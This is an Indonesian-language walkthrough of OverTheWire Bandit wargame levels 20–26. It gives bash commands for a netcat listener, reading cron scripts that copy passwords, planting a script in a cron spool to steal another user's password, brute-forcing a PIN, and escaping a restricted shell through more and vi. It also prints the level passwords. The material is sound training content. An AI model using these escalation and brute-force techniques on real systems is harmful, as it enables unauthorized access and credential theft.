## Level 20 - Level 21

### Level Goal

There is a `setuid binary` in the `homedirectory` that does the following: it makes a connection to `localhos`t on the `port` you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

**NOTE:** Try connecting to your own network daemon to see if it works as you think

### Commands you may need to solve this level

`ssh, nc, cat, bash, screen, tmux, Unix ‘job control’ (bg, fg, jobs, &, CTRL-Z, …)`

- Writeup
    
    Level ini mengajarkan konsep **Network Sockets** dan komunikasi antar-proses. Kita harus membuat sebuah *listener* (server mini) yang akan menerima koneksi dari program setuid `./suconnect`. Program tersebut akan mengirimkan password level saat ini, dan jika kita mengirimkan balik password yang sama, ia akan memberikan password level berikutnya.
    
    ```bash
    # Cek file yang ada di direktori home
    ls -l
    
    # Buka port listener di background dan siapkan password level 20 untuk dikirim
    # Ganti [PASSWORD_LEVEL_20] dengan password asli Anda
    echo "VxCazJaVykH6Lv6yueYv17Zb02uS2Scf" | nc -l -p 1234 &
    
    # Jalankan program suconnect untuk menghubungkan ke port yang baru kita buka
    ./suconnect 1234
    ```
    
    - **`nc -l -p 1234`**: Menggunakan **Netcat** untuk mendengarkan (*listen*) pada port 1234.
    - **`&`**: Menjalankan perintah di *background* sehingga kita bisa mengetikkan perintah selanjutnya tanpa harus menutup listener tersebut.
    - **`./suconnect 1234`**: Menjalankan binary yang akan mencoba melakukan koneksi ke localhost pada port 1234. Program ini akan mengirimkan password bandit20 ke port tersebut dan menunggu balasan yang sama.
    - **`echo "[pass]" | nc ...`**: Mengirimkan string password secara otomatis segera setelah `./suconnect` melakukan koneksi ke listener kita.

## Level 21 - Level 22

### Level Goal

A program is running automatically at regular intervals from **`cron`**, the time-based job scheduler. Look in **`/etc/cron.d/`** for the configuration and see what command is being executed.

### Commands you may need to solve this level

`cron, crontab, crontab(5) (use “man 5 crontab” to access this)`

- Writeup
    
    Password untuk level berikutnya disimpan di dalam sebuah file di `/etc/bandit_pass/bandit22`, namun hanya bisa dibaca oleh user `bandit22`. Sebuah tugas otomatis (*cron job*) berjalan secara berkala sebagai user `bandit22` untuk menjalankan script yang membocorkan password tersebut ke lokasi tertentu.
    
    ```bash
    # Melihat daftar pekerjaan cron yang tersedia
    ls /etc/cron.d/
    
    # Memeriksa isi konfigurasi cron untuk bandit22
    cat /etc/cron.d/cronjob_bandit22
    
    # Membaca isi script shell yang dijalankan oleh cron tersebut
    cat /usr/bin/cronjob_bandit22.sh
    
    # Membaca file password yang dihasilkan oleh script di direktori /tmp
    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
    ```
    
    - **`ls /etc/cron.d/`**: Digunakan untuk melihat daftar tugas terjadwal yang didefinisikan secara sistem.
    - **`cat /etc/cron.d/cronjob_bandit22`**: Perintah ini menunjukkan bahwa ada script yang berjalan setiap menit (`* * * *`) sebagai user `bandit22`.
    - **`cat /usr/bin/cronjob_bandit22.sh`**: Membedah logika script. Di dalamnya terdapat perintah: `cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`. Artinya, password disalin ke file di `/tmp`.
    - `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`: Membaca file hasil salinan tersebut untuk mendapatkan password asli milik bandit22.

## Level 22 → Level 23

### Level Goal

A program is running automatically at regular intervals from **`cron`**, the time-based job scheduler. Look in **`/etc/cron.d/`** for the configuration and see what command is being executed.

**NOTE:** Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

### Commands you may need to solve this level

`cron, crontab, crontab(5) (use “man 5 crontab” to access this)`

- Writeup
    
    Level ini memperkenalkan konsep **Cron jobs**, yaitu sistem penjadwalan tugas otomatis di Linux. Tantangannya adalah kita harus menganalisis sebuah skrip shell yang dijalankan oleh user lain (`bandit23`) untuk mengetahui di mana ia menyimpan password level berikutnya.
    
    ```bash
    # Mencari tugas otomatis yang berjalan di sistem
    ls /etc/cron.d/
    
    # Membaca isi konfigurasi cron job milik bandit23
    cat /etc/cron.d/cronjob_bandit23
    
    # Menganalisis isi skrip yang dijalankan secara otomatis tersebut
    cat /usr/bin/cronjob_bandit23.sh
    
    # SIMULASI LOGIKA: Hitung nama file target jika user-nya adalah 'bandit23'
    # Kita jalankan perintah ini secara manual untuk menebak nama file rahasianya
    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
    # Output: 8ca319486bfbbc3663ea0fbe81326349
    
    # Membaca file password yang sudah dibuat oleh sistem (cron) di folder /tmp
    cat /tmp/8ca319486bfbbc3663ea0fbe81326349
    ```
    
    - **`ls /etc/cron.d/`**: Melihat daftar file tugas terjadwal. Di sini kita menemukan adanya tugas untuk `bandit23`.
    - **`cat /usr/bin/cronjob_bandit23.sh`**: Membedah logika skrip. Skrip tersebut mengambil nama user (`whoami`), mengubahnya menjadi string hash MD5, lalu menyalin password ke `/tmp/[nama_hash]`.
    - **`echo I am user bandit23 | md5sum`**: Karena skrip asli menggunakan variabel `$myname`, kita menggantinya secara manual dengan `bandit23` untuk mengetahui "nama file rahasia" yang dihasilkan oleh sistem khusus untuk level berikutnya.
    - **`cut -d ' ' -f 1`**: Memotong hasil MD5 agar kita hanya mendapatkan string hash-nya saja tanpa karakter tambahan.
    - **`cat /tmp/8ca3...`**: Mengambil password yang sudah diletakkan di sana oleh tugas otomatis (cron) yang berjalan setiap menit.

## Level 23 → Level 24

### Level Goal

A program is running automatically at regular intervals from **`cron`**, the time-based job scheduler. Look in **`/etc/cron.d/`** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

### Commands you may need to solve this level

`chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)`

- Writeup
    
    Level ini mengajarkan cara mengeksploitasi **Cron Job** (tugas otomatis) yang berjalan dengan hak akses user lain. Kita akan membuat shell script sederhana agar user `bandit24` mengambilkan password untuk kita.
    
    ```bash
    # Buat direktori kerja sementara di /tmp dan beri izin akses penuh
    mkdir /tmp/solusi_bandit24
    chmod 777 /tmp/solusi_bandit24
    cd /tmp/solusi_bandit24
    
    # Buat script payload untuk mengambil password
    echo '#!/bin/bash' > exploit.sh
    echo 'cat /etc/bandit_pass/bandit24 > /tmp/solusi_bandit24/password.txt' >> exploit.sh
    
    # Beri izin eksekusi pada script agar bisa dijalankan oleh Cron
    chmod 777 exploit.sh
    
    # Salin script ke direktori yang dipantau oleh cronjob bandit24
    cp exploit.sh /var/spool/bandit24/foo/
    
    # Tunggu hingga 1 menit (karena cron berjalan setiap menit)
    # Cek secara berkala sampai file password.txt muncul
    ls -la
    cat password.txt
    ```
    
    - **`mkdir /tmp/solusi_bandit24`**: Membuat folder di area sementara karena kita tidak bisa menulis file di home directory.
    - **`chmod 777`**: Memberikan izin **Read, Write, Execute** kepada semua user. Ini wajib agar user `bandit24` (yang menjalankan cron) bisa membaca script kita dan menulis hasilnya ke folder kita.
    - **`#!/bin/bash`**: Baris *shebang* yang wajib ada agar sistem tahu bahwa ini adalah script shell.
    - **`cat /etc/bandit_pass/bandit24 > ...`**: Isi perintah dalam script. Kita menyuruh user `bandit24` membaca password-nya sendiri dan menyimpannya ke file teks di folder kita.
    - **`cp exploit.sh /var/spool/bandit24/foo/`**: Meletakkan script di folder "tugas" bandit24. Semua file di folder ini akan dijalankan otomatis lalu dihapus oleh sistem.

## Level 24 - Level 25

### Level Goal

A daemon is listening on port `30002` and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time

- Writeup
    
    Pada level ini, kita diminta untuk melakukan brute force pada layanan yang berjalan di port `30002`. Layanan tersebut memerlukan password dari level saat ini (bandit24) dan sebuah PIN 4-digit (0000-9999) yang dipisahkan oleh spasi.
    
    ```bash
    # Membuat direktori kerja sementara di /tmp
    mkdir /tmp/my_brute_force
    cd /tmp/my_brute_force
    
    # Membuat script bash untuk menghasilkan 10.000 kombinasi PIN
    # Ganti [ISI_PASSWORD_BANDIT24_DI_SINI] dengan password yang Anda miliki
    cat <<EOF > solve.sh
    #!/bin/bash
    password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
    for i in {0000..9999}
    do
        echo "$password $i"
    done | nc localhost 30002
    EOF
    
    # Memberikan izin eksekusi pada script
    chmod +x solve.sh
    
    # Menjalankan script
    ./solve.sh
    ```
    
    - **`mkdir /tmp/my_brute_force`**: Membuat folder di direktori `/tmp` karena user bandit hanya memiliki izin menulis (write access) di sana, bukan di home directory.
    - **`for i in {0000..9999}`**: Sebuah perulangan (loop) yang secara otomatis menghasilkan angka berurutan dari 0000 sampai 9999 dengan format 4 digit.
    - **`nc localhost 30002`**: Menghubungkan output dari script ke layanan yang berjalan di port 30002. Netcat akan mengirimkan semua kombinasi password+PIN dalam satu sesi koneksi.

## Level 25 → Level 26

### Level Goal

Logging in to `bandit26` from `bandit25` should be fairly easy… The shell for user `bandit26` is not **`/bin/bash`**, but something else. Find out what it is, how it works and how to break out of it.

> NOTE: if you’re a Windows user and typically use Powershell to ssh into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.
> 

### Commands you may need to solve this level

`ssh, cat, more, vi, ls, id, pwd`

- Writeup
    
    
    Level ini melatih ketangkasan dalam memanipulasi *restricted shell* (shell terbatas). User `bandit26` tidak memiliki shell standar (`/bin/bash`), melainkan skrip yang langsung mengeluarkan user setelah menampilkan teks.
    
    ```bash
    # Di terminal laptop/lokal Anda (bukan di dalam server), 
    # Perkecil ukuran jendela terminal hingga sangat pendek (gepeng).
    
    # Lakukan SSH dari terminal lokal Anda langsung ke bandit26 menggunakan kunci privat.
    # (Pastikan Anda sudah menyalin isi bandit26.sshkey ke file lokal atau menggunakan command ini)
    ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
    
    # Karena jendela kecil, muncul tulisan "--More--". Tekan tombol:
    v
    
    # Di dalam editor VI yang terbuka, ketik perintah berikut:
    :set shell=/bin/bash
    
    # Panggil shell dengan mengetik:
    :shell
    
    # Sekarang Anda adalah bandit26. Baca password Anda sendiri:
    cat /etc/bandit_pass/bandit26
    ```
    
    - **`ssh -i bandit26.sshkey`**: Login sebagai `bandit26` menggunakan kunci identitas. Kita melakukan ini dari luar karena server memblokir koneksi antar-localhost.
    - **`more` & Ukuran Terminal**: Skrip login `bandit26` menjalankan `more`. Dengan terminal kecil, `more` berhenti menunggu input agar teks tidak terpotong.
    - **`v`**: Membuka editor `vi` dari dalam pager `more`. Ini adalah "pintu belakang" untuk keluar dari batasan skrip login.
    - **`:set shell=/bin/bash`**: Mengubah variabel internal `vi` agar merujuk ke shell Linux yang normal.
    - **`:shell`**: Membuka sesi shell interaktif di dalam `vi`. Tanpa langkah ini, Anda akan langsung terputus (*disconnected*) saat mencoba keluar dari `vi`.
    - **`cat /etc/bandit_pass/bandit26`**: Setelah mendapatkan shell yang stabil, Anda memiliki izin untuk membaca password level Anda saat ini.